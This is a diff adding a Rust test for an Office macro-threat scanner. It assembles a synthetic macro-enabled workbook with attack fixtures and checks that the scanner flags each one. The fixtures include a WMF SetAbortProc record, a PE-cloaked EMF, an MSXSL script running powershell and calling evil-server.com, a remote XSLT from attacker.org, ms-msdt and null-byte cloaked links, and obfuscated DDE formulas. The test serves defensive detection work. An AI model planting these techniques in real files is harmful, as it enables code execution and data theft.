@@ -4416,3 +4416,226 @@ fn e2e_docprops_webext_pivot_and_transpose_lookup_threat_inspection() {
         "JSON missing VBA-CELL-040"
     );
 }
+
+#[test]
+fn e2e_metafile_xslt_relcloaking_and_dbcs_threat_inspection() {
+    let content_types = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
+  <Default Extension="wmf" ContentType="image/x-wmf"/>
+  <Default Extension="emf" ContentType="image/x-emf"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+  <Override PartName="/word/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"/>
+</Types>"#;
+
+    let root_rels = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    // 1. Synthesize WMF with SetAbortProc exploit record (CVE-2005-4560)
+    let mut wmf_bytes = Vec::new();
+    // Aldus Placeable Metafile header (22 bytes)
+    wmf_bytes.extend_from_slice(&[0xD7, 0xCD, 0xC6, 0x9A]);
+    wmf_bytes.resize(22, 0);
+    // Standard WMF header (18 bytes)
+    wmf_bytes.extend_from_slice(&[0x01, 0x00, 0x09, 0x00, 0x00, 0x03]);
+    wmf_bytes.resize(40, 0);
+    // Record size (4 bytes LE = 4 words) + Record function (2 bytes LE = 0x052F)
+    wmf_bytes.extend_from_slice(&[0x04, 0x00, 0x00, 0x00, 0x2F, 0x05]);
+    wmf_bytes.extend_from_slice(&[0x00, 0x00]);
+
+    // 2. Synthesize EMF with cloaked Windows PE executable header
+    let mut emf_bytes = Vec::new();
+    emf_bytes.extend_from_slice(b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00");
+    emf_bytes.resize(128, 0);
+    emf_bytes.extend_from_slice(b"PE\0\0\x4c\x01\x03\x00");
+    emf_bytes.resize(256, 0);
+
+    // 3. Synthesize customXml with MSXSL script execution and WScript.Shell
+    let xslt_xml = br#"<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt">
+    <msxsl:script language="JScript" implements-prefix="user">
+        var sh = new ActiveXObject("WScript.Shell");
+        sh.Run("powershell -enc malcode");
+    </msxsl:script>
+    <xsl:template match="/">
+        <xsl:value-of select="document('http://evil-server.com/exfil')"/>
+    </xsl:template>
+</xsl:stylesheet>"#;
+
+    // 4. Synthesize styles.xml with saveThroughXslt remote transform
+    let styles_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:styles xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+    <w:saveThroughXslt r:id="rIdX" target="https://attacker.org/template.xslt"/>
+</w:styles>"#;
+
+    // 5. Synthesize workbook.xml.rels with relationship target cloaking (null byte, percent-encoded ms-msdt, named pipe)
+    let rels_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+    <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+    <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="payload.exe%00.pdf" TargetMode="External"/>
+    <Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="%6d%73-%6d%73%64%74:otc/test" TargetMode="External"/>
+    <Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink" Target="\\.\pipe\malicious_coercion_pipe" TargetMode="External"/>
+</Relationships>"#;
+
+    // 6. Synthesize worksheet with DELTA, GESTEP, and DBCS string function de-obfuscation
+    let sheet1_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+    <sheetData>
+        <row r="1">
+            <!-- Cell A1 evaluates DELTA + GESTEP into DDE payload: cmd|'/c calc'!A1 -->
+            <c r="A1" t="str">
+                <f>CONCAT(IF(DELTA(5, 5), "cmd|", ""), IF(GESTEP(10, 2), "'/c calc'!A1", ""))</f>
+            </c>
+            <!-- Cell B1 evaluates DBCS functions into powershell LOLBin -->
+            <c r="B1" t="str">
+                <f>CONCAT(LEFTB("powershell", 5), MIDB("12345shell", 6, 5))</f>
+            </c>
+        </row>
+    </sheetData>
+</worksheet>"#;
+
+    let workbook_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+    <sheets>
+        <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+    </sheets>
+</workbook>"#;
+
+    let project_bytes = synthesize_cfb_project(
+        "VBAProject",
+        &[("Module1", "Sub AutoOpen()\nEnd Sub\n", &[])],
+        &[],
+    );
+
+    let entries: Vec<(&str, &[u8])> = vec![
+        ("[Content_Types].xml", content_types),
+        ("_rels/.rels", root_rels),
+        ("xl/workbook.xml", workbook_xml),
+        ("xl/_rels/workbook.xml.rels", rels_xml),
+        ("xl/worksheets/sheet1.xml", sheet1_xml),
+        ("xl/media/image1.wmf", &wmf_bytes),
+        ("word/media/image2.emf", &emf_bytes),
+        ("customXml/item1.xml", xslt_xml),
+        ("word/styles.xml", styles_xml),
+        ("xl/vbaProject.bin", &project_bytes),
+    ];
+
+    let zip_bytes = synthesize_zip(&entries);
+    let options = AnalysisOptions {
+        limits: Limits::default(),
+        host_profile: HostProfile::Excel,
+        ..Default::default()
+    };
+
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("inspection should succeed");
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify VBA-CELL-041: MetafileExploitOrPayloadSmuggling
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "MetafileExploitOrPayloadSmuggling"
+                && t.cell_ref.contains("image1.wmf")
+                && t.description.contains("META_SETABORTPROC")),
+        "Expected WMF SetAbortProc exploit detection in image1.wmf: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "MetafileExploitOrPayloadSmuggling"
+                && t.cell_ref.contains("image2.emf")
+                && t.description.contains("cloaked Windows PE")),
+        "Expected EMF cloaked PE executable detection in image2.emf: {threats:?}"
+    );
+
+    // 2. Verify VBA-CELL-042: XsltTransformOrScriptInjection
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "XsltTransformOrScriptInjection"
+                && t.cell_ref.contains("item1.xml")
+                && t.description.contains("MSXSL script")),
+        "Expected MSXSL script execution detection in item1.xml: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "XsltTransformOrScriptInjection"
+                && t.cell_ref.contains("styles.xml")
+                && t.description.contains("XSLT transform targeting remote")),
+        "Expected remote XSLT transform detection in styles.xml: {threats:?}"
+    );
+
+    // 3. Verify VBA-CELL-043: RelationshipTargetCloakingOrEvasion
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "RelationshipTargetCloakingOrEvasion"
+                && t.description.contains("payload.exe%00.pdf")),
+        "Expected null-byte cloaking detection in rId3: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "RelationshipTargetCloakingOrEvasion"
+                && t.description.contains("ms-msdt:")),
+        "Expected percent-encoded ms-msdt protocol detection in rId4: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "RelationshipTargetCloakingOrEvasion"
+                && t.description.contains("malicious_coercion_pipe")),
+        "Expected named pipe coercion detection in rId5: {threats:?}"
+    );
+
+    // 4. Verify formula de-obfuscation: DELTA/GESTEP (Cell A1) & DBCS LEFTB/MIDB (Cell B1)
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && (t.threat_kind == "DDE" || t.threat_kind == "DeobfuscatedThreat")
+            && t.description.contains("cmd|'/c calc'!A1")),
+        "Cell A1 should resolve DDE through DELTA and GESTEP evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell")),
+        "Cell B1 should resolve powershell LOLBin threat through DBCS evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-041, VBA-CELL-042, VBA-CELL-043
+    let sarif = inspection_to_sarif(&inspection, "file:///test/metafile_xslt_relcloaking.xlsm");
+    assert!(
+        sarif.contains("VBA-CELL-041"),
+        "SARIF must contain VBA-CELL-041 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-042"),
+        "SARIF must contain VBA-CELL-042 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-043"),
+        "SARIF must contain VBA-CELL-043 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-041, VBA-CELL-042, VBA-CELL-043
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-041\""),
+        "JSON missing VBA-CELL-041"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-042\""),
+        "JSON missing VBA-CELL-042"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-043\""),
+        "JSON missing VBA-CELL-043"
+    );
+}
